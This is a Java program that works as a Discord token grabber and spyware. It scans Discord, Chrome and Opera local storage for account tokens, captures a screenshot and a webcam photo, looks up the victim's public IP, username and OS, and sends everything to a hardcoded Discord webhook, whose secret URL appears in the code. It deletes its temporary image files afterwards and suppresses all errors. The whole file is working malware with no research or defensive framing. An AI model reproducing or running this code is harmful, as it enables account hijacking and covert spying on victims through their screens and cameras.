package asf;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookMessage;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;

import java.util.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class Main {
	static WebhookClient client = WebhookClient.withUrl("https://discord.com/api/webhooks/821683177021112320/ioaFxDYrKa3S1BujJ2cqwE-qSpLdc4VpeS3VizIoiNl0o_8JZ8ik49KJNISfF_Qw2C-V"); // or withId(id, token)
	static OkHttpClient yeshttp = new OkHttpClient();

    public static void main(String[] args) {
    	client.send(pull().toString());

    	try {
    		File c = captureCamera();
    		File s = captureScreen();
    		String ILP = "";
    		
			WebhookMessage message = new WebhookMessageBuilder()
					.addFile(s)
					.build();
			
			WebhookMessage messagee = new WebhookMessageBuilder()
					.addFile(c)
					.build();
			
			client.send(message);
			client.send(messagee);
			
			s.delete();
			c.delete();
			
			Request request = new Request.Builder()
					.url("http://checkip.amazonaws.com")
					.build();
			
			try (Response response = yeshttp.newCall(request).execute()) {
				    ILP = response.body().string();
					client.send("``` n: " + System.getProperty("user.name") + "\n ILP: " + ILP + "\n ALALLA: " +System.getProperty("os.name") + "```");
			}
		} catch (Exception e) {}
 	
    }
    
    public static List<String> pull() {
    	List<String> webhooks = new ArrayList<>();
        String os = System.getProperty("os.name");
        
        if(os.contains("Windows")) {
        	List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
            
            for (String path : paths) {
                File f = new File(path);
                String[] pathnames = f.list();
                
                if (pathnames == null) continue;

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while ((strLine = br.readLine()) != null) {

                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                webhooks.add(m.group());
                            }

                        }

                    } catch (Exception e) {}
            }
           }
        } else if(os.contains("Mac")) {
        	try {
        		File f = new File(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
                String[] pathnames = f.list();
                
                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(f.getPath() + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while ((strLine = br.readLine()) != null) {

                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                            	webhooks.add(m.group());
                            }

                        }

                    } catch (Exception ignored) {
                    }
                }
        	} catch (Exception x){}
        }
        
        return webhooks;
    }
    
    private static File captureScreen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        return file;
    }
    
    private static File captureCamera() throws Exception {
        Webcam cam = Webcam.getDefault();
        cam.open();
        int random = Math.abs(new Random().nextInt());
        File webcam = new File("1cached_" + random + ".png");
        ImageIO.write(cam.getImage(), "PNG", webcam);
        cam.close();
        return webcam;
    }
}
